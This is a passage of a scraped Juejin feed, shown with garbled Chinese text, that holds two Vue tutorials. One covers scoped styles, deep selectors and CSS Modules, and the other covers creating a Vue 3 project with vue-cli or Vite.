table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<h2 data-id="heading-0">Â scoped</h2>
<blockquote>
<p>scopedæ˜¯Vueç»„ä»¶æ ‡ç­¾ä¸­çš„ä¸€ä¸ªç‰¹æ€§,ä½œç”¨æ˜¯é™åˆ¶CSS åªä½œç”¨äºå½“å‰ç»„ä»¶ï¼Œé˜²æ­¢å½±å“å…¨å±€æˆ–å…¶ä»–ç»„ä»¶ã€‚
</p></blockquote>
<h4 data-id="heading-1">ä½œç”¨åŸç†</h4>
<blockquote>
<p>Â Vue é€šè¿‡ è‡ªåŠ¨æ·»åŠ å±æ€§é€‰æ‹©å™¨ï¼ˆå¦‚ <code>data-v-xxxx</code>ï¼‰æ¥ä½œç”¨äºå½“å‰ç»„ä»¶çš„å…ƒç´ ï¼Œä»è€Œå®ç° CSS ä½œç”¨åŸŸéš”ç¦»ã€‚</p>
</blockquote>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    Scoped æ ·å¼ç¤ºä¾‹
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>Â ç¼–è¯‘å</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">div</span> class="container" data-v-abc123&gt;Scoped æ ·å¼ç¤ºä¾‹&lt;/<span class="hljs-selector-tag">div</span>&gt;
<span class="hljs-selector-class">.container</span><span class="hljs-selector-attr">[data-v-abc123]</span> {
  <span class="hljs-attribute">color</span>: red;
}
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-2">deep</h2>
<blockquote>
<p><code>/deep/</code>ï¼ˆæˆ– <code>::v-deep</code>ï¼‰åœ¨ Vue ä¸­ç”¨äº<strong>ç©¿é€ scoped æ ·å¼</strong>ï¼Œä½œç”¨æ˜¯è®©<strong>æ ·å¼ä½œç”¨äºå­ç»„ä»¶çš„æ·±å±‚æ¬¡å…ƒç´ </strong>ï¼Œå³ä½¿å®ƒä»¬ä½äº <code>scoped</code> ä½œç”¨åŸŸå†…ã€‚</p>
</blockquote>
<h4 data-id="heading-3">å®é™…å¼€å‘åº”ç”¨</h4>
<ul>
<li>Â ä¿®æ”¹ç¬¬ä¸‰æ–¹åº“(Element UI,Antç­‰)ç»„ä»¶æ ·å¼</li>
<li>ç›´æ¥ä½œç”¨å­ç»„ä»¶æ·±å±‚æ¬¡çš„å…ƒç´ </li>
</ul>
<h4 data-id="heading-4">ä½¿ç”¨æ–¹å¼</h4>
<h5 data-id="heading-5">vue2(/deep/æˆ–è€…&gt;&gt;&gt;)</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
/deep/ <span class="hljs-selector-class">.child-element</span> {
  <span class="hljs-attribute">color</span>: red;
}

<span class="hljs-comment">/* æˆ–è€…ä½¿ç”¨ &gt;&gt;&gt;ï¼Œå®ƒæ˜¯ `/deep/` çš„åˆ«å */</span>
&gt;&gt;&gt; <span class="hljs-selector-class">.child-element</span> {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h5 data-id="heading-6">Â vue3(::v-deep() æˆ–è€…:deep())</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
::<span class="hljs-built_in">v-deep</span>(.child-element) {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
:<span class="hljs-built_in">deep</span>(.child-element) {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-7">CSS Modules</h2>
<h4 data-id="heading-8">ä¼˜ç‚¹</h4>
<ul>
<li><strong>é¿å…å…¨å±€æ ·å¼å†²çª</strong>ï¼šæ¯ä¸ªç»„ä»¶çš„æ ·å¼éƒ½æ˜¯å±€éƒ¨çš„ï¼Œä¸ä¼šå½±å“å…¶ä»–ç»„ä»¶ã€‚</li>
<li><strong>æ”¯æŒåŠ¨æ€ç»‘å®š</strong>ï¼šå¯ä»¥ç”¨ <code>:class</code> ç»‘å®šåŠ¨æ€æ ·å¼ã€‚</li>
<li><strong>é€‚ç”¨äº Vue ç»„ä»¶åŒ–å¼€å‘</strong>ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤§å‹é¡¹ç›®ä¸­æ›´å®¹æ˜“ç®¡ç†ã€‚</li>
</ul>
<h4 data-id="heading-9">åŸºæœ¬ä½¿ç”¨</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"$style.title"</span>&gt;</span>Hello CSS Modules<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">module</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.title</span> {
  <span class="hljs-attribute">color</span>: red;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h4 data-id="heading-10">ä½œç”¨åŸç†</h4>
<p>1.titleç±»åä¼šè¢«è‡ªåŠ¨è½¬æ¢æˆä¸€ä¸ªå”¯ä¸€çš„åç§°</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.title___3ghj2</span> { <span class="hljs-attribute">color</span>: red; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>; }
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>2.ç»„ä»¶ä¸­çš„ <code>:class="$style.title"</code> ä¼šè¢«è½¬æ¢æˆè¿™ä¸ªå”¯ä¸€ç±»å</p>
<h4 data-id="heading-11">çˆ¶ç»„ä»¶ä¼ é€’ CSS ModulesÂ </h4>
<p>çˆ¶ç»„ä»¶:Â </p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">:styles</span>=<span class="hljs-string">"$style"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">module</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.parentTitle</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
  <span class="hljs-attribute">color</span>: green;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>å­ç»„ä»¶</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"styles.parentTitle"</span>&gt;</span>æˆ‘æ˜¯å­ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-title function_">defineProps</span>([<span class="hljs-string">"styles"</span>]);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h4 data-id="heading-12">Â Vue ç»„ä»¶å¤–éƒ¨ä½¿ç”¨ CSS Modules</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">"./style.module.css"</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"styles.box"</span>&gt;</span>å¤–éƒ¨ CSS Modules<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>style.module.css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">background-color</span>: yellow;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
}
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3---(1)é¡¹ç›®å·¥ç¨‹åˆ›å»º]]></title>    <link>https://juejin.cn/post/7583973613197361167</link>    <guid>https://juejin.cn/post/7583973613197361167</guid>    <pubDate>2025-12-16T03:42:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973613197361167" data-draft-id="7583971282892472372" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3---(1)é¡¹ç›®å·¥ç¨‹åˆ›å»º"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:42:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯æ— æ¶¯"/> <meta itemprop="url" content="https://juejin.cn/user/3967483738859639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3---(1)é¡¹ç›®å·¥ç¨‹åˆ›å»º
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3967483738859639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯æ— æ¶¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:42:24.000Z" title="Tue Dec 16 2025 03:42:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<h2 data-id="heading-0">Â 1.åŸºäºvue-cli åˆ›å»º</h2>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment"># æŸ¥çœ‹@vue/cliç‰ˆæœ¬ï¼Œç¡®ä¿@vue/cliç‰ˆæœ¬åœ¨4.5.0ä»¥ä¸Š</span></span>
vue --version
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># å®‰è£…æˆ–è€…å‡çº§ä½ çš„@vue/cli</span></span> 
npm install -g @vue/cli
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># æ‰§è¡Œåˆ›å»ºå‘½ä»¤</span></span>
vue create vue3_project
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">#  éšåé€‰æ‹©3.x</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#  Choose a version of Vue.js that you want to start the project with (Use arrow keys)</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#  &gt; 3.x</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#    2.x</span></span>
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># å¯åŠ¨</span></span>
cd vue3_project
npm run serve
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-1">2.åŸºäºviteåˆ›å»º</h2>
<p><strong>å‰ææ¡ä»¶:</strong></p>
<ul>
<li>ç†Ÿæ‚‰å‘½ä»¤è¡Œ</li>
<li>å·²å®‰è£… 18.3 æˆ–æ›´é«˜ç‰ˆæœ¬çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2F" title="https://nodejs.org/" target="_blank" ref="nofollow noopener noreferrer">Node.js</a></li>
</ul>
<p>Â è¿è¡Œå‘½ä»¤è¡Œå‘½ä»¤_</p>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vue<span class="hljs-variable">@latest</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>æ ¹æ®è‡ªå·±é¡¹ç›®çš„å®é™…æƒ…å†µé€‰æ‹©é…ç½®é¡¹,å®Œæˆé¡¹ç›®å·¥ç¨‹åŸºæœ¬é…ç½®</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd24e04ece954288a5274dc4a3bd85c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5peg5rav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461344&amp;x-signature=9mjZuNWoHNYMk3YkKsfxIlfkk2o%3D" alt="" loading="lazy"/><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/>â€‹</p>
<p><strong>è¡¥å……æç¤º:</strong></p>
<ul>
<li>æ¨èçš„ IDE é…ç½®æ˜¯Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2F" title="https://code.visualstudio.com/" target="_blank" ref="nofollow noopener noreferrer">Visual Studio Code</a>Â +Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DVue.volar" title="https://marketplace.visualstudio.com/items?itemName=Vue.volar" target="_blank" ref="nofollow noopener noreferrer">Vue - Official æ‰©å±•</a></li>
<li>è¦äº†è§£æ„å»ºå·¥å…· Vite æ›´å¤šèƒŒåçš„ç»†èŠ‚ï¼Œè¯·æŸ¥çœ‹Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vitejs.dev%2F" title="https://cn.vitejs.dev/" target="_blank" ref="nofollow noopener noreferrer">Vite æ–‡æ¡£</a>ã€‚</li>
<li>å¦‚æœä½ é€‰æ‹©ä½¿ç”¨ TypeScriptï¼Œè¯·é˜…è¯»Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fguide%2Ftypescript%2Foverview.html" title="https://cn.vuejs.org/guide/typescript/overview.html" target="_blank" ref="nofollow noopener noreferrer">TypeScript ä½¿ç”¨æŒ‡å—</a>ã€‚Â </li>
</ul>
<h2 data-id="heading-2">3.å·¥ç¨‹æ–‡ä»¶åˆ—è¡¨</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0cb42aac090e418cb072f61a4e39d22a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5peg5rav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461344&amp;x-signature=AP3r7vZRrAsq82OxOPvFfPxbqcs%3D" alt="" loading="lazy"/><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/>â€‹</p>
<pre><code class="hljs language-csharp" lang="csharp">vue3-project-vite/
â”‚â”€â”€ node_modules/        <span class="hljs-meta"># ä¾èµ–åº“ï¼Œ`npm install` åç”Ÿæˆ</span>
â”‚â”€â”€ <span class="hljs-keyword">public</span>/              <span class="hljs-meta"># é™æ€èµ„æºç›®å½•ï¼Œä¸ä¼šè¢« Vite å¤„ç†ï¼Œç›´æ¥æ˜ å°„åˆ°æ ¹ç›®å½•</span>
â”‚   â”œâ”€â”€ favicon.ico      <span class="hljs-meta"># ç½‘ç«™å›¾æ ‡</span>
â”‚â”€â”€ src/                 <span class="hljs-meta"># æºä»£ç ç›®å½•ï¼ˆVue ç»„ä»¶ã€é¡µé¢ã€çŠ¶æ€ç®¡ç†ç­‰ï¼‰</span>
â”‚   â”œâ”€â”€ assets/          <span class="hljs-meta"># å­˜æ”¾é™æ€èµ„æºï¼ˆå›¾ç‰‡ã€CSSï¼‰</span>
â”‚   â”œâ”€â”€ components/      <span class="hljs-meta"># å¤ç”¨ç»„ä»¶,å¸¸ç”¨å°è£…åŠŸèƒ½ç»„ä»¶</span>
â”‚   â”œâ”€â”€ views/           <span class="hljs-meta"># ä¸»è¦é¡µé¢ï¼ˆé€šå¸¸æŒ‰è·¯ç”±åˆ’åˆ†ï¼‰</span>
â”‚   â”œâ”€â”€ router/          <span class="hljs-meta"># Vue Router é…ç½®,ç®¡ç†é¡µé¢è·¯ç”±</span>
â”‚   â”œâ”€â”€ store/           <span class="hljs-meta"># Vuex / Pinia çŠ¶æ€ç®¡ç†</span>
â”‚   â”œâ”€â”€ App.vue          <span class="hljs-meta"># æ ¹ç»„ä»¶,æ‰€æœ‰é¡µé¢ç»„ä»¶çš„çˆ¶ç»„ä»¶</span>
â”‚   â”œâ”€â”€ main.js / main.ts <span class="hljs-meta"># å…¥å£æ–‡ä»¶ï¼Œåˆå§‹åŒ– Vue å®ä¾‹</span>
â”‚â”€â”€ .gitignore           <span class="hljs-meta"># Git å¿½ç•¥æ–‡ä»¶</span>
â”‚â”€â”€ index.html           <span class="hljs-meta"># å…¥å£ HTML æ–‡ä»¶</span>
â”‚â”€â”€ package.json         <span class="hljs-meta"># ä¾èµ–å’Œè„šæœ¬é…ç½®</span>
â”‚â”€â”€ vite.config.js       <span class="hljs-meta"># Vite é…ç½®æ–‡ä»¶</span>
â”‚â”€â”€ tsconfig.json        <span class="hljs-meta"># TypeScript é…ç½®ï¼ˆä»… TypeScript é¡¹ç›®ï¼‰</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>é‡ç‚¹åŒºåˆ«:</strong> vue3ä¸vue2å·¥ç¨‹æ–‡ä»¶åŒºåˆ«ç‚¹æœ€å¤§çš„åœ°æ–¹åœ¨äº,å…¥å£æ–‡ä»¶vue3æ˜¯index.htmlæ–‡ä»¶,æµè§ˆå™¨åŠ è½½æ—¶æœ€å…ˆè§£æ,viteå¤„ç†HTMLæ–‡ä»¶é€šè¿‡
</p><pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">""</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/favicon.ico"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
